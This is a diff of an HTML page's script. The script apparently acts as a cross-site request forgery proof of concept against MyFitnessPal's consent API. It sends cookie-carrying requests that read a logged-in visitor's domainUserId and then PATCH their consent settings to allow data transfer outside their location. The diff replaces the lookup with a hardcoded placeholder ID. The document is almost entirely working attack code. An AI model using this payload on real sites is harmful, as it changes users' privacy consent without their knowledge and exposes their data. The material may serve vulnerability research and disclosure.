@@ -5,37 +5,38 @@
 // 目标API地址
 const apiUrl = 'https://www.myfitnesspal.com/api/idm/user-with-consents';
 
-// 1. 同步GET请求：获取响应中的domainUserId（确保拿到值后再执行PATCH）
+/*
 let domainUserId = '';
 const xhrGet = new XMLHttpRequest();
-xhrGet.open('GET', apiUrl, false); // false=同步请求，阻塞后续代码
-xhrGet.withCredentials = true; // 携带登录态Cookie
+xhrGet.open('GET', apiUrl, false); 
+xhrGet.withCredentials = true; 
 xhrGet.send();
-// 解析响应，提取domainUserId
+
 if (xhrGet.status === 200) {
   const resData = JSON.parse(xhrGet.responseText);
-  domainUserId = resData.domainUserId; // 从GET响应中获取domainUserId
+  domainUserId = resData.domainUserId; 
 }
+*/
+  
 
-// 2. PATCH请求：替换domainUserId并提交指定请求体
-if (domainUserId) { // 拿到有效值才发起PATCH
+const domainUserId = "1234567890"; 
+if (domainUserId && domainUserId !== "Your_domainUserId") { 
   const xhrPatch = new XMLHttpRequest();
   xhrPatch.open('PATCH', apiUrl, true);
-  xhrPatch.withCredentials = true; // 携带登录态Cookie
-  xhrPatch.setRequestHeader('Content-Type', 'application/json'); // 必加，标识JSON请求体
-  // 构造请求体，替换Your_domainUserId为真实值
+  xhrPatch.withCredentials = true;
+  xhrPatch.setRequestHeader('Content-Type', 'application/json');
   const requestBody = {
     "account_links": [
       {
         "domain":"MFP",
-        "domainUserId": domainUserId, // 替换为GET获取的真实domainUserId
+        "domainUserId": domainUserId,
         "consent_matrix_version":"nc.20250403.01",
         "consents":{"transfer_outside_location":true},
         "ad_consents_last_seen":"2026-01-23T11:23:23.942Z"
       }
     ]
   };
-  xhrPatch.send(JSON.stringify(requestBody)); // 转JSON字符串提交
+  xhrPatch.send(JSON.stringify(requestBody));
 }
 </script>
 </body>
